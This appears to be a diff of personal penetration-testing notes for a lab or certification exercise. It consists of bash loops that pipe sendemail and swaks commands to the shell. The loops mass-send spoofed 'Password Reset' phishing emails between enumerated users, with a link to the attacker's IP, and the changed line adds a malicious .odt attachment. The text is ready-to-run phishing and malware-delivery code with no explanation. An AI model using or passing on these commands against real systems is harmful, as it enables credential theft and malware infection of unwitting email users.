@@ -90,7 +90,7 @@ for name in $(cat valid.txt); for name2 in $(cat valid.txt); do echo "sudo swaks
 for line in $(cat all-swaks.txt); do echo $line|bash; done
 
 # Sometimes the base of the domain, banzai instead of banzai.local, works better
-for user1 in $(cat users.txt); for user2 in $(cat users.txt); do echo "sendemail -t $user1@$dom -f $user2@$dom -s $dom -u 'Password Reset' -m 'Please follow this link to reset your password: http://$myip/' -o tls=no"|bash; done
+for user1 in $(cat users.txt); for user2 in $(cat users.txt); do echo "sendemail -t $user1@$dom -f $user2@$dom -s $dom -u 'Password Reset' -m 'Please follow this link to reset your password: http://$myip/' -a /home/kali/oscp/twe/windows-evil.odt -o tls=no"|bash; done
 
 for user1 in $(cat valid.txt); for user2 in $(cat valid.txt); do echo "sendemail -t $user1@$dc -f $user2@$dc -s $dc -u 'Password Reset' -m 'Please follow this link to reset your password: http://$myip/' -o tls=no"|bash; done
 ```
